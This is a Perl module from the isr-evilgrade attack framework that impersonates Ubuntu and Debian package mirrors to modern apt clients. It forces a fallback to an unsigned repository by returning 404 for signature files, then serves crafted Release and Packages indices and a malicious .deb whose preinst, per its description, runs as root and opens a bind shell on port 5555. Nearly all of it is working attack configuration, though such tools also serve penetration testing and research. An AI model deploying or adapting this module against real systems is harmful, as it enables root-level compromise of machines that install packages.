###############
# apt_modern.pm
#
# APT repository MITM for modern apt (deb822 / apt >= 2.x).
#
# Classic evilgrade apt module serves legacy index files (Packages.bz2,
# Release.gpg) that apt 2.x/3.x no longer drives the install from. This module
# serves a *consistent* flat repo: a Release listing each Packages index by
# SHA256, the Packages indices themselves, and a malicious .deb referenced by
# that index. With the victim's source marked "Trusted: yes" (the classic
# unauthenticated-repo / signature-stripping scenario), apt-get update and
# apt-get install complete and the package's maintainer script runs as root.
#
# Serves (all exact bytes, parse=0 so the Release hashes stay valid):
#   dists/stable/InRelease        -> 404 (force fallback to unsigned Release)
#   dists/stable/Release.gpg      -> 404 (unsigned; accepted via Trusted: yes)
#   dists/stable/Release          -> crafted Release (hashes of the indices)
#   .../binary-*/Packages[.gz]    -> crafted package index
#   pool/.../seed-evil_1.0_all.deb-> malicious package (preinst = root RCE)
#   everything else               -> 404 (clean, so apt does not hard-fail)
#
# This file is part of isr-evilgrade, www.faradaysec.com .
##
package modules::apt_modern;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $r = './include/apt_modern/repo';

my $h404 = "HTTP/1.1 404 Not Found\r\n"
    . "Content-Type: text/plain\r\n"
    . "Connection: close\r\n\r\n";
my $h_text = "HTTP/1.1 200 OK\r\n"
    . "Content-Type: text/plain\r\n"
    . "Connection: close\r\n\r\n";
my $h_gz = "HTTP/1.1 200 OK\r\n"
    . "Content-Type: application/octet-stream\r\n"
    . "Connection: close\r\n\r\n";
my $h_deb = "HTTP/1.1 200 OK\r\n"
    . "Content-Type: application/vnd.debian.binary-package\r\n"
    . "Connection: close\r\n\r\n";

my $base = {
    'name'        => 'apt (modern repo)',
    'version'     => '1.0',
    'appver'      => 'apt >= 2.x / deb822 (Trusted: yes repo)',
    'cve'         => 'CVE-2019-3462',   # apt repo content-injection / unauth repo class
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
APT repository MITM for modern apt. Serves a consistent unsigned repository
(Release + Packages indices + malicious .deb) that apt-get update/install will
accept when the source is marked Trusted: yes. The package's preinst runs as
root at install time (drops /tmp/OWNED_BY_EVILGRADE and opens a bind shell on
tcp/5555). Mirrors the classic unauthenticated-repo apt attack class.
},
    # NOTE: evilgrade matches the request *host* against this string, so these
    # must be literal mirror hostnames (DNS-spoof them to evilgrade).
    'vh' => '(archive.ubuntu.com|security.ubuntu.com|ports.ubuntu.com|deb.debian.org|ftp.debian.org)',
    'request' => [
        # --- InRelease first: 404 so apt falls back to unsigned Release ---
        {   'req' => '/InRelease$', 'type' => 'string', 'method' => '',
            'bin' => 0, 'string' => '', 'parse' => 0, 'file' => '',
            'cheader' => $h404,
        },
        # --- Release.gpg: 404 (unsigned repo, accepted via Trusted: yes) ---
        {   'req' => '/Release\.gpg$', 'type' => 'string', 'method' => '',
            'bin' => 0, 'string' => '', 'parse' => 0, 'file' => '',
            'cheader' => $h404,
        },
        # --- Release: the crafted index listing ---
        # NOTE: no cheader -> evilgrade's getheader() auto-adds Content-length
        # (apt's http method rejects a 200 without it: "Undetermined Error").
        {   'req' => '/Release$', 'type' => 'file', 'method' => '',
            'bin' => 1, 'string' => '', 'parse' => 0,
            'file' => "$r/dists/stable/Release",
        },
        # --- Packages.gz (preferred by apt over plain) ---
        {   'req' => 'binary-([^/]+)/Packages\.gz$', 'type' => 'file', 'method' => '',
            'bin' => 1, 'string' => '', 'parse' => 0,
            'file' => "$r/dists/stable/main/binary-arm64/Packages.gz",
        },
        # --- compressions we do NOT provide: 404 so apt falls back to .gz ---
        {   'req' => 'Packages\.(xz|zst|bz2|lz4)$', 'type' => 'string', 'method' => '',
            'bin' => 0, 'string' => '', 'parse' => 0, 'file' => '',
            'cheader' => $h404,
        },
        # --- plain Packages ---
        {   'req' => 'binary-([^/]+)/Packages$', 'type' => 'file', 'method' => '',
            'bin' => 1, 'string' => '', 'parse' => 0,
            'file' => "$r/dists/stable/main/binary-arm64/Packages",
        },
        # --- the malicious package ---
        {   'req' => '/seed-evil[^/]*\.deb$', 'type' => 'file', 'method' => '',
            'bin' => 1, 'string' => '', 'parse' => 0,
            'file' => "$r/pool/main/s/seed-evil/seed-evil_1.0_all.deb",
        },
        # --- catch-all: clean 404 so apt never hard-fails on a closed socket ---
        {   'req' => '.', 'type' => 'string', 'method' => '',
            'bin' => 0, 'string' => '', 'parse' => 0, 'file' => '',
            'cheader' => $h404,
        },
    ],

    'options' => {
        'agent' => {
            'val'  => "$r/pool/main/s/seed-evil/seed-evil_1.0_all.deb",
            'desc' => 'Malicious package served by the repo'
        },
        'enable' => {
            'val'  => 0,
            'desc' => 'Status'
        },
    }
};

sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
